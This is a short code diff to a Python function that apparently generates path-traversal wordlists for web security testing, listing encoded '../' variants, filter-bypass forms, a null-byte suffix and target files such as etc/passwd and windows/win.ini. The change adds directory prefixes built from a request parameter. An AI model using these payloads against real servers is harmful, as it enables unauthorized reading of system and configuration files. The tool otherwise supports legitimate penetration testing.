@@ -24,7 +24,7 @@ def generate_wordlist(args):
     single_options = ["/", "\\"]
     path_traversal_options = ["../", "....//", r"....\/", r"%2e%2e%2f", r"%252e%252e%252f", r"..%c0%af", r"..%ef%bc%8f", "\\..", "..././"]
     targets_files = ["etc/passwd", "etc/apache2/apache2.conf", "\\windows\\win.ini", "windows/win.ini", "\\windows\\system32\\drivers\\etc\\hosts", "windows/system32/drivers/etc/hosts"]
-    common_directories_filter = ["/var/www/images/"]
+    common_directories_filter = ["/var/www/images/", f"{args.param}/", f"{args.param}s/"]
     web_extensions = ["png", "jpg", "php", "html", "js", "aspx", "asp"]
     special_suffix = [r"%00"]
 
